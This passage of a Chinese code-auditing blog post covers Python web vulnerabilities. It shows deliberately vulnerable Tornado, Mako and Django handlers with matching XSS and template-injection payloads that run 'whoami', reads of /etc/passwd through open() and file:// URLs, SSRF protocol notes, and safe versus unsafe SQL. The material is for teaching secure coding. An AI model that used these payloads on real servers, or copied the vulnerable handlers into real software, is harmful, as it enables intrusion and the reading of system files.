<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.template</span><br><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line">TEMPLATE = <span class="string">'''</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string"> &lt;head&gt;&lt;title&gt; Hello {{ name }} &lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt; Hello ascotbe &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainHandler</span>(tornado.web.RequestHandler):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        name = <span class="variable language_">self</span>.get_argument(<span class="string">'name'</span>, <span class="string">''</span>)</span><br><span class="line">        template_data = TEMPLATE.replace(<span class="string">"ascotbe"</span>,name)</span><br><span class="line">        t = tornado.template.Template(template_data)</span><br><span class="line">        <span class="variable language_">self</span>.write(t.generate(name=name))</span><br><span class="line"></span><br><span class="line">application = tornado.web.Application([</span><br><span class="line">    (<span class="string">r"/"</span>, MainHandler),</span><br><span class="line">], debug=<span class="literal">True</span>, static_path=<span class="literal">None</span>, template_path=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    application.listen(<span class="number">8000</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.instance().start()</span><br></pre></td></tr></tbody></table></figure>
<p>xss代码</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8000</span>/?name=hi%3Cimg%20src=<span class="number">1</span>%20onerror=alert(%22xss%<span class="number">22</span>);%3E</span><br></pre></td></tr></tbody></table></figure>
<p>注入</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8000</span>/?name={%<span class="keyword">import</span> os%}{{os.popen(<span class="string">"whoami"</span>).read()}}</span><br></pre></td></tr></tbody></table></figure>
<p><strong>Mako</strong></p>
<p>mako 本身可以完美支持 Python 语句，所以利用 &lt;% %&gt;、&lt;%! %&gt;、${} 可以非常轻松地进行攻，还有进行结构控制的%for … : %endfor、%if … : … %elif: … % else: … %endif。自定义函数&lt;%def name=”…” &gt; … &lt;/%def&gt;，调用：${…()}。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> mako.template <span class="keyword">import</span> Template</span><br><span class="line"><span class="comment"># http://127.0.0.1:9999/api/test/?name={{11*10}}</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">request</span>):</span><br><span class="line">    name = request.GET[<span class="string">"name"</span>]</span><br><span class="line">    t = Template(<span class="string">"Hello,"</span>+name)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(t.render())</span><br></pre></td></tr></tbody></table></figure>
<p>进行代码执行，没有回显</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="built_in">__import__</span>(<span class="string">"os"</span>).system(<span class="string">'whoami'</span>)%&gt;</span><br><span class="line">${<span class="built_in">__import__</span>(<span class="string">"os"</span>).system(<span class="string">"whoami"</span>)}</span><br></pre></td></tr></tbody></table></figure>
<p><strong>XXE</strong></p>
<p>对于XXE问题只需要设置resolve_entities为False即可解决漏洞，如果没有设置的都能够执行命令</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">parser = etree.XMLParser(resolve_entities=<span class="literal">False</span>)</span><br><span class="line">tree = etree.fromstring(xml,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></tbody></table></figure>
<p>任意文件读取</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs;codecs.<span class="built_in">open</span>(<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line">file(<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line"><span class="built_in">open</span>(<span class="string">'/etc/passwd'</span>).read()</span><br></pre></td></tr></tbody></table></figure>
<p><strong>Server Side Request</strong><br>重定向</p>
<p>是否默认跟随重定向<br>1.pycurl（不跟随）<br>2.urllib/urllib2/requests（跟随）</p>
<p>默认最大重定向次数<br>1.pycurl（未限制）<br>2.urllib/urllib2（10次）<br>3.requests（30次）</p>
<p>协议支持</p>
<p>urllib/urllib2：分别有协议类型http、https、ftp、file</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line">a= request.urlopen(<span class="string">'file:///etc/passwd'</span>)</span><br><span class="line"><span class="built_in">print</span>(a.read())</span><br><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line">a=urllib.urlopen(<span class="string">'file:///etc/passwd'</span>)</span><br><span class="line"><span class="built_in">print</span>(a.read())</span><br><span class="line">b=urllib2.urlopen(<span class="string">'file:///etc/passwd'</span>)</span><br><span class="line"><span class="built_in">print</span>(b.read())</span><br></pre></td></tr></tbody></table></figure>
<p>requests：分别有协议类型http、https、ftp<br>pycurl：分别有协议类型dict、file、ftp、ftps、gopher、http、https、imap、imaps、ldap、ldaps、pop3、pop3s、rtmp、rtsp、scp、sftp、smtp、smtps、telnet和tftp。libcurl支持ssl证书、http-post、http-put、ftp上传、基于http表单的上传、代理、cookie、用户+密码认证（basic、digest、ntlm、negotiate、kerberos4）、文件传输恢复、http代理隧道等</p>
<p><strong>XSS</strong></p>
<p>未对输入和输出做过滤，以Django举例</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="comment"># http://127.0.0.1:9999/api/test/?name=&lt;video&gt;&lt;source onerror="alert(1)"&gt;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">request</span>):</span><br><span class="line">    name = request.GET[<span class="string">'name'</span>]</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'hello %s'</span> %(name))</span><br><span class="line">    <span class="comment"># return render('hello.html', {'name':name})  # Django3以上正确的代码 </span></span><br></pre></td></tr></tbody></table></figure>
<p><strong>SQL</strong></p>
<p>安全的写法</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stmt <span class="operator">=</span> "SELECT * FROM table WHERE id=?"</span><br><span class="line">connection.execute(stmt, (<span class="keyword">value</span>,))</span><br></pre></td></tr></tbody></table></figure>
<p>不安全的写法</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">"SELECT * FROM table WHERE id=" <span class="operator">+</span> <span class="keyword">value</span></span><br><span class="line">"SELECT * FROM table WHERE id=%s" <span class="operator">%</span> <span class="keyword">value</span></span><br><span class="line">"SELECT * FROM table WHERE id={0}".format(<span class="keyword">value</span>)</span><br></pre></td></tr></tbody></table></figure></article><div class="post-copyright"><div class="post-copyright__author_group"><a class="post-copyright__author_img" href="/about/"><img class="post-copyright__author_img_front" src="/img/favicon.ico"></a><div class="post-copyright__author_name">空天之境</div><div class="post-copyright__author_desc">专注于网络安全和科技生活</div></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div id="quit-box" onclick="RemoveRewardMask()"></div><div class="post-reward"><div class="reward-button" title="赞赏作者" onclick="AddRewardMask()"><i class="solitude fa-solid fa-heart"></i>赞赏作者</div><div class="reward-main"><ul class="reward-all"><span class="reward-title">Thanks for your appreciation. / 感谢您的赞赏</span><ul class="reward-group"></ul><a class="reward-main-btn" href="/about/"><div class="reward-text">赞赏名单</div><div class="reward-dec">Because of your support, I realize the value of writing articles. / 由于您的支持，我才能够实现写作的价值。</div></a></ul></div></div><script>function RemoveRewardMask() {
    let rewardMainElements = document.querySelectorAll(".reward-main");
    let quitBoxElement = document.querySelector("#quit-box");

    rewardMainElements.forEach(element => {
        element.style.display = "none";
    });

    if (quitBoxElement) {
        quitBoxElement.style.display = "none";
    }
}

function AddRewardMask() {
    let rewardMainElements = document.querySelectorAll(".reward-main");
    let quitBoxElement = document.querySelector("#quit-box");

    rewardMainElements.forEach(element => {
        element.style.display = "flex";
    });

    if (quitBoxElement) {
        quitBoxElement.style.display = "flex";
    }
}</script></div></div><div class="social-share"><a class="social-share-ico icon-qq" target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly9jb25uZWN0LnFxLmNvbS93aWRnZXQvc2hhcmVxcS9pbmRleC5odG1sP3VybD1odHRwcyUzQSUyRiUyRmJsb2cudzB4a2luZy51cy5rZyUyRnBvc3RzJTJGZTc2NTRlODIuaHRtbCZ0aXRsZT0lRTQlQkIlQTMlRTclQTAlODElRTUlQUUlQTElRTglQUUlQTElRTclQUMlOTQlRTglQUUlQjAlRUYlQkMlODhQeXRob24lRUYlQkMlODkmZGVzYz0lRTYlODAlQkIlRTclQkIlOTMlRTQlQjglODAlRTQlQkElOUIlRTUlQjglQjglRTglQTclODElRTQlQkIlQTMlRTclQTAlODElRTQlQjglQUQlRTQlQjglOEQlRTUlQUUlODklRTUlODUlQTglRTclOUElODQlRTUlODYlOTklRTYlQjMlOTUmc3VtbWFyeT0lRTYlODAlQkIlRTclQkIlOTMlRTQlQjglODAlRTQlQkElOUIlRTUlQjglQjglRTglQTclODElRTQlQkIlQTMlRTclQTAlODElRTQlQjglQUQlRTQlQjglOEQlRTUlQUUlODklRTUlODUlQTglRTclOUElODQlRTUlODYlOTklRTYlQjMlOTUmc2l0ZT0lRTQlQkIlQTMlRTclQTAlODElRTUlQUUlQTElRTglQUUlQTElRTclQUMlOTQlRTglQUUlQjAlRUYlQkMlODhQeXRob24lRUYlQkMlODkmcGljcz1odHRwcyUzQSUyRiUyRncweGtpbmcuZ2l0aHViLmlvJTJGcGljeC1pbWFnZXMtaG9zdGluZyUyRiVFNiU4OCU5OCVFNSU4RiU4Qy0oMTApLjdpMDZiYnFuNzIuanBn" title="分享到QQ"><i class="solitude fab fa-qq"></i></a><a class="social-share-ico icon-weibo" target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cDovL3NlcnZpY2Uud2VpYm8uY29tL3NoYXJlL3NoYXJlLnBocD91cmw9aHR0cHMlM0ElMkYlMkZibG9nLncweGtpbmcudXMua2clMkZwb3N0cyUyRmU3NjU0ZTgyLmh0bWwmdGl0bGU9JUU0JUJCJUEzJUU3JUEwJTgxJUU1JUFFJUExJUU4JUFFJUExJUU3JUFDJTk0JUU4JUFFJUIwJUVGJUJDJTg4UHl0aG9uJUVGJUJDJTg5JnBpYz1odHRwcyUzQSUyRiUyRncweGtpbmcuZ2l0aHViLmlvJTJGcGljeC1pbWFnZXMtaG9zdGluZyUyRiVFNiU4OCU5OCVFNSU4RiU4Qy0oMTApLjdpMDZiYnFuNzIuanBn" title="分享到微博"><i class="solitude fab fa-weibo"></i></a><div class="social-share-ico icon-qrcode" title="使用手机扫码阅读这篇文章"><i class="solitude fas fa-qrcode"></i><div class="share-main"><div class="share-main-all"><div id="qrcode"></div><div class="reward-dec">使用手机扫码阅读这篇文章</div></div></div><script pjax="">typeof QRCode === 'function' && new QRCode(document.getElementById("qrcode"), 'https://blog.w0xking.us.kg/posts/e7654e82.html');
window.addEventListener('DOMContentLoaded', () => {
    new QRCode(document.getElementById("qrcode"), 'https://blog.w0xking.us.kg/posts/e7654e82.html');
});
</script></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本文是原创文章，采用<a target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo">CC BY-NC-SA 4.0</a>协议，完整转载请注明来自<a href="/">空天之境</a></span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%A1%E8%AE%A1/"><span class="tags-punctuation"><i class="solitude fa-solid fa-hashtag"></i>审计<span class="tagsPageCount">1</span></span></a><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"><i class="solitude fa-solid fa-hashtag"></i>代码安全<span class="tagsPageCount">1</span></span></a></div></div></div><nav class="needEndHide pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/8e6daf7b.html"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">道德经</div></div></a></div><div class="next-post pull-right"><a href="/posts/b85a533c.html"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Windows本地密码抓取</div></div></a></div></nav><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="solitude fa-solid fa-comment"></i><span> 评论</span><span class="count"> (<span class="twikoo-count"><i class="solitude fa-solid fa-spinner fa-spin"></i></span>)</span></div></div><div class="comment-wrap"><div id="twikoo-wrap"></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><div class="author-info__top-group"><div class="author-info__sayhi" id="author-info__sayhi" onclick="sco.changeSayHelloText()">sayhello.morning</div></div></div><div class="avatar-img-group"><img class="avatar-img" alt="头像" src="https://img.skyking.us.kg/file/1741221516032_02_2tx.png"></div><div class="author-info__description_group"><div class="author-info__description">这是我的博客，</div><div class="author-info__description2">欢迎来到空天之境！</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about/"><div class="author-info__name">SkyKing</div><div class="author-info__desc">专注于网络安全和科技生活</div></a><div class="card-info-social-icons is-center"><a class="social-icon" target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly9naXRodWIuY29tL3cweGtpbmc=" title="Github"><i class="solitude  fab fa-github"></i></a><a class="social-icon" target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly9zcGFjZS5iaWxpYmlsaS5jb20vIw==" title="Bilibili"><i class="solitude  fab fa-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="solitude fa-solid fa-bars"></i><span>文章目录</span></div><div class="toc-content" id="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%87%E5%87%86%E5%BA%93%E5%8D%B1%E9%99%A9%E6%A8%A1%E5%9D%97"><span class="toc-text">标准库危险模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-text">内置危险函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#globals-%E6%A8%A1%E5%9D%97"><span class="toc-text">__globals__模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Magic-Method%EF%BC%88%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%EF%BC%89"><span class="toc-text">Magic Method（魔术方法）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%87%BD%E6%95%B0%E6%9F%A5%E6%89%BE"><span class="toc-text">特殊函数查找</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6"><span class="toc-text">绕过限制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E7%BC%96%E7%A0%81%E8%BF%9B%E8%A1%8C%E5%AF%BC%E5%85%A5"><span class="toc-text">使用编码进行导入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E8%A2%AB%E5%88%A0%E9%99%A4"><span class="toc-text">内置函数被删除</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%83%A8%E5%88%86%E6%A8%A1%E5%9D%97%E8%A2%AB%E9%99%90%E5%88%B6"><span class="toc-text">部分模块被限制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%88%96%E8%80%85%E6%A8%A1%E5%9D%97%E5%85%A8%E8%A2%AB%E5%88%A0%E9%99%A4"><span class="toc-text">文件或者模块全被删除</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pickle"><span class="toc-text">pickle</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#opcode"><span class="toc-text">opcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PyYAML"><span class="toc-text">PyYAML</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="solitude fa-solid fa-map"></i><span>最近发布</span></div><div class="aside-list"><a class="aside-list-item" href="/posts/8fa9.html" title="网络行为规定"><div class="thumbnail"><img alt="网络行为规定" src="https://w0xking.github.io/picx-images-hosting/dh.9dd3ns7bz6.jpg"></div><div class="content"><span class="title" href="/posts/8fa9.html" title="网络行为规定">网络行为规定</span><span class="article-recent_post_categories" href="/posts/8fa9.html">党务</span></div></a><a class="aside-list-item" href="/posts/ip.html" title="ip-test"><div class="thumbnail"><img alt="ip-test" src="https://api.qjqq.cn/api/Img?sort=belle&amp;random=200"></div><div class="content"><span class="title" href="/posts/ip.html" title="ip-test">ip-test</span><span class="article-recent_post_categories" href="/posts/ip.html">网络</span></div></a><a class="aside-list-item" href="/posts/4340.html" title="ArgoX小白版教程"><div class="thumbnail"><img alt="ArgoX小白版教程" src="https://api.qjqq.cn/api/Img?sort=belle&amp;random=691"></div><div class="content"><span class="title" href="/posts/4340.html" title="ArgoX小白版教程">ArgoX小白版教程</span><span class="article-recent_post_categories" href="/posts/4340.html">serv00</span></div></a><a class="aside-list-item" href="/posts/3eeb.html" title="Hello World"><div class="thumbnail"><img alt="Hello World" src="https://api.qjqq.cn/api/Img?sort=belle"></div><div class="content"><span class="title" href="/posts/3eeb.html" title="Hello World">Hello World</span></div></a><a class="aside-list-item" href="/posts/d2d7725.html" title="Markdown语法自带格式"><div class="thumbnail"><img alt="Markdown语法自带格式" src="https://w0xking.github.io/picx-images-hosting/战双-(17).3k7sunfmnw.jpg"></div><div class="content"><span class="title" href="/posts/d2d7725.html" title="Markdown语法自带格式">Markdown语法自带格式</span><span class="article-recent_post_categories" href="/posts/d2d7725.html">教程</span></div></a></div></div></div></div></main><footer id="footer"><div id="st-footer-bar"><div class="footer-logo"><span>空天之境</span></div><div class="footer-bar-description"></div><a class="footer-bar-link" href="/about/"></a></div><div id="footer_deal"><a class="deal_link" target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly9naXRodWIuY29tL3cweGtpbmc=" title="Github"><i class="solitude  fab fa-github"></i></a><a class="deal_link" href="mailto:kking@iubridge.com" title="Mail"><i class="solitude  solitude fas fa-envelope-open"></i></a><div class="nolazyload footer_mini_logo" id="footer_mini_logo" title="返回顶部" onclick="sco.toTop()"><img src="/img/02_2tx.png" alt="返回顶部"></div><a class="deal_link" target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly9zcGFjZS5iaWxpYmlsaS5jb20vIw==" title="Bilibili"><i class="solitude  fab fa-bilibili"></i></a><a class="deal_link" target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly92LmRvdXlpbi5jb20vIy8=" title="Douyin"><i class="solitude  fab fa-tiktok"></i></a></div><div id="st-footer"><div class="footer-group"><h3 class="footer-title">导航</h3><div class="footer-links"><a class="footer-item" href="/archives/" title="文章">文章</a><a class="footer-item" href="/categories/" title="分类">分类</a><a class="footer-item" href="/tags/" title="标签">标签</a></div></div><div class="footer-group"><h3 class="footer-title">排列</h3><div class="footer-links"><a class="footer-item" href="/cookies/" title="Cookies">Cookies</a><a class="footer-item" href="/privacy/" title="Privacy">Privacy</a><a class="footer-item" href="/copyright/" title="Copyright">Copyright</a></div></div><div class="footer-group"><div class="footer-title-group"><h3 class="footer-title">友链</h3><button class="random-friends-btn" onclick="randomLinksList()" title="友链"><i class="solitude fa-solid fa-arrows-rotate"></i></button></div><div class="footer-links" id="friend-links-in-footer"></div></div></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div class="copyright">© 2021 - 2025 By&nbsp;<a class="footer-bar-link" href="/"><img class="author-avatar" src="/img/favicon.ico">SkyKing</a></div></div><div class="footer-bar-right"><a class="footer-bar-link" href="/atom.xml" alt="RSS">RSS</a><a class="footer-bar-link cc" target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="solitude fa-solid fa-copyright"></i><i class="solitude fa-brands fa-creative-commons-by"></i><i class="solitude fa-brands fa-creative-commons-nc"></i><i class="solitude fa-brands fa-creative-commons-nd"></i></a></div></div></div><div class="comment-barrage needEndHide"></div></footer></div><!-- right_menu--><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="solitude fa-solid fa-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="solitude fa-solid fa-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="solitude fa-solid fa-arrows-rotate"></i></div><div class="rightMenu-item" id="menu-top"><i class="solitude fa-solid fa-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="solitude fa-solid fa-clone"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="solitude fa-solid fa-clipboard"></i><span>粘贴文本</span></div><div class="rightMenu-item" id="menu-commenttext"><i class="solitude fa-solid fa-comment-medical"></i><span>引用到评论</span></div><div class="rightMenu-item" id="menu-newwindow"><i class="solitude fa-regular fa-window-maximize"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="solitude fa-solid fa-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="solitude fa-solid fa-clone"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="solitude fa-solid fa-cloud-arrow-down"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-search"><i class="solitude fa-solid fa-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="solitude fa-solid fa-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="solitude fa-solid fa-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="solitude fa-solid fa-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="solitude fa-solid fa-clone"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><div class="rightMenu-item" id="menu-randomPost" onclick="toRandomPost()||rm.hideRightMenu()"><i class="solitude fas fa-tower-broadcast"></i><span>随机文章</span></div><div class="rightMenu-item" onclick="pjax.loadUrl('/categories/')||rm.hideRightMenu()"><i class="solitude fas fa-clone"></i><span>全部分类</span></div><div class="rightMenu-item" onclick="pjax.loadUrl('/tags/')||rm.hideRightMenu()"><i class="solitude fas fa-tags"></i><span>全部标签</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><div class="rightMenu-item" id="menu-commentBarrage" onclick="sco.switchCommentBarrage()"><i class="solitude fa-solid fa-comment"></i><span class="menu-commentBarrage-text">关闭热评</span></div><div class="rightMenu-item" id="menu-darkmode" onclick="sco.switchDarkMode()"><i class="solitude fa-solid fa-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></div></div></div><div id="rightmenu-mask"></div><!-- inject body--><div><script src="/js/utils.js?v=2.1.12"></script><script src="/js/main.js?v=2.1.12"></script><script src="/js/third_party/waterfall.min.js?v=2.1.12"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/pjax/0.2.8/pjax.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/third_party/universe.min.js?v=2.1.12"></script><script>dark()
</script><script src="/js/tw_cn.js?v=2.1.12"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/vanilla-lazyload/19.1.3/lazyload.iife.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/node-snackbar/0.1.16/snackbar.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.1.0/medium-zoom.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/11.0.5/swiper-bundle.min.js"></script><script src="/js/third_party/post_ai.min.js?v=2.1.12"></script><script>var meting_api = 'https://meting.qjqq.cn/?server=:server&type=:type&id=:id&auth=:auth&r=:r';</script><script src="https://cdnjs.cloudflare.com/ajax/libs/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/meting/2.0.1/Meting.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/color-thief/2.6.0/color-thief.min.js"></script><script src="/js/covercolor/local.js?v=2.1.12"></script><script>window.paceOptions = {
  restartOnPushState: false
}

utils.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')
</script><script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js"></script><script src="/js/right_menu.js?v=2.1.12"></script><script src="https://open.lightxi.com/unpkg/chinese-lunar@0.1.4/lib/chinese-lunar.js"></script><script defer="" pjax="" src="/js/custom.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/11.0.5/swiper-bundle.min.js"></script><script async="" data-pjax="" src="/js/message_us.js"></script><div class="js-pjax"><script>(() => {
    const getCount = () => {
        const ele = document.querySelectorAll('.twikoo-count')
        if (!ele) return
        twikoo.getCommentsCount({
            envId: 'https://twikoo.w0xking.us.kg/',
            region: '',
            urls: [window.location.pathname],
            includeReply: false
        }).then(res => {
            ele.forEach(item => item.textContent = res[0].count)
        }).catch(err => {
            console.error(err)
        })
    }
    const init = () => {
        twikoo.init(Object.assign({
            el: '#twikoo-wrap',
            envId: 'https://twikoo.w0xking.us.kg/',
            region: '',
            path: window.location.pathname,
            onCommentLoaded: () => {
                GLOBAL_CONFIG.lightbox && utils.lightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
            }
        }, null))

         && getCount()
        sco.owoBig({
            body: '.OwO-body',
            item: '.OwO-items li'
        })

        true && barrageTwikoo()
    }

    const loadTwikoo = () => {
        if (typeof twikoo === 'object') setTimeout(init,0)
        else utils.getScript('https://cdnjs.cloudflare.com/ajax/libs/twikoo/1.6.40/twikoo.all.min.js').then(init)
    }

    if ('Twikoo' === 'Twikoo' || true) {
